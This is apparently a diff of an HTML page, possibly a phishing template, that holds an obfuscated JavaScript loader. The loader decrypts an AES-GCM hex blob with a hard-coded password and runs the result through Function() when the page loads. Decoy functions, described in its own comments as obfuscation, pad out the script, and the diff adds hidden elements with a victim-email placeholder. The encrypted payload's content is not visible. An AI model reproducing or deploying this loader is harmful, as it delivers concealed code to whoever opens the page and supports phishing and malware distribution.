@@ -1,17 +1,19 @@
+<!DOCTYPE html>
+<span nike-tes2="" hidden adidas="<%=EMAIL64%>"></span>
 <script>
-    // Converts a hex string into a Uint8Array
+    // Helper function to convert hex to Uint8Array
     const hexToBytes = (hex) => {
-        // Split into chunks of two, then map to bytes
+        console.log("Converting hex to bytes...");
         return Uint8Array.from(hex.match(/.{2}/g).map((h) => parseInt(h, 16)));
     };
 
-    // Decrypts the given encrypted data
+    // Function to decrypt AES-GCM encrypted data
     const decrypt = async (enc, ivHex, saltHex, key) => {
-        console.log("Starting decryption process...");
-        const iv = hexToBytes(ivHex); // Initialization vector
-        const salt = hexToBytes(saltHex); // Salt for the key derivation
+        console.log("Starting decryption...");
+        const iv = hexToBytes(ivHex);
+        const salt = hexToBytes(saltHex);
 
-        console.log("Generating key material...");
+        console.log("Preparing key material...");
         const keyMaterial = await crypto.subtle.importKey(
             "raw",
             new TextEncoder().encode(key),
@@ -20,7 +22,6 @@
             ["deriveKey"]
         );
 
-        // Generate the AES-GCM key
         const aesKey = await crypto.subtle.deriveKey(
             { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
             keyMaterial,
@@ -29,55 +30,76 @@
             ["decrypt"]
         );
 
-        console.log("Attempting to decrypt...");
+        console.log("Attempting decryption...");
         try {
-            const dec = await crypto.subtle.decrypt(
+            const decryptedBytes = await crypto.subtle.decrypt(
                 { name: "AES-GCM", iv },
                 aesKey,
                 hexToBytes(enc)
             );
-            console.log("Decryption successful!");
-            return new TextDecoder().decode(dec); // Decode the decrypted text
-        } catch (e) {
-            console.error("Decryption failed. Ensure the key, IV, and salt are correct:", e);
-            throw e;
+            console.log("Decryption succeeded!");
+            return new TextDecoder().decode(decryptedBytes);
+        } catch (error) {
+            console.error("Decryption failed:", error);
+            throw error;
         }
     };
 
+    // Useless helper function to simulate random delays
+    const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
     // Self-executing async function
     (async () => {
+        console.log("Starting script execution...");
+
+        // Dummy variable for added obfuscation
+        const placeholderText = "Placeholder";
+        console.log("Placeholder initialized:", placeholderText);
+
+        // Encryption parameters
         const params = {
-            iv: "c444d6b988c97f7ea2aa5716", // IV (Initialization Vector)
-            salt: "06b9dcb639aeb4a298624e4d2709f4c3", // Salt for key derivation
+            iv: "c444d6b988c97f7ea2aa5716",
+            salt: "06b9dcb639aeb4a298624e4d2709f4c3",
             data: "26cbae7ed8856d9cd8d7fed943b6b4057d02f653f16ad4b50df937b866b7491270da18b75c5b1ae09454dfc024e1b06af75301f0b4d1429df0198573f04c1fa219e4eb7b055c8fc740f4cd0bce40244c73927abba0d44a2910efd70981c5002a099cb8ac42273d78c2da6a22762bb4bc1e702426a9f0b75e074607bca07e7122a60e92fe1d35ee602910fce409af78027670a7b55d09608632b357201c6a14a7da17eb9b30d60c98e95f85a26a3e7a27406c70c88c74ebf167a2de66ec9853c6c2bbd82ee92a6f",
         };
 
+        // Decrypt the data
         try {
-            // Perform decryption
+            console.log("Decrypting data...");
             const result = await decrypt(params.data, params.iv, params.salt, "quickescape");
-            console.log("Decrypted Text:", result);
+            console.log("Decrypted Result:", result);
 
-            // Dummy additional functionality
-            console.log("Performing a dummy operation...");
-            Function(`${result}`)(); // Execute the decrypted string as code
+            // Execute decrypted text as a function (if valid JavaScript code)
+            console.log("Executing decrypted content...");
+            Function(`${result}`)();
 
-            // Additional useless logic
-            const isPalindrome = (str) => str === str.split("").reverse().join("");
-            const extraCheck = result.length % 2 ? "Odd Length" : "Even Length";
-            const palindromeCheck = isPalindrome(result) ? "Palindrome!" : "Not a Palindrome!";
-            console.log("Length Check:", extraCheck, "| Palindrome Check:", palindromeCheck);
+            // Add random operations for obfuscation
+            console.log("Adding random operations...");
+            const reverseString = (str) => str.split("").reverse().join("");
+            const reversed = reverseString(result);
+            console.log("Reversed Text:", reversed);
 
-        } catch (e) {
-            console.error("Execution error:", e);
+            // Dummy logic to check string properties
+            const lengthType = result.length % 2 === 0 ? "Even" : "Odd";
+            // console.log("String Length Type:", lengthType);
+        } catch (error) {
+            // console.error("Error during decryption or execution:", error);
         }
 
-        // Add a completely useless block for obfuscation
-        const dummyLogic = () => {
-            console.log("This logic serves no purpose!");
-            const randomNum = Math.random();
-            console.log("Random number:", randomNum);
-        };
-        dummyLogic();
+        // Random dummy logic
+        // console.log("Executing random useless logic...");
+        const generateRandomString = () => Math.random().toString(36).substring(2, 15);
+        const randomString = generateRandomString();
+        // console.log("Generated Random String:", randomString);
+
+        // Add delay to simulate "complex" operations
+        await delay(1000);
+        // console.log("Simulation delay complete.");
+
+        // Completely unrelated logic for further obfuscation
+        // console.log("Running unrelated computation...");
+        const fib = (n) => (n <= 1 ? n : fib(n - 1) + fib(n - 2));
+        const randomFib = fib(10);
+        // console.log("Computed Fibonacci of 10:", randomFib);
     })();
-</script> <y1>build</y1>
-<h1 nike-owar="" hidden adidas="<%=EMAIL64%>" >document</h1>
+</script>
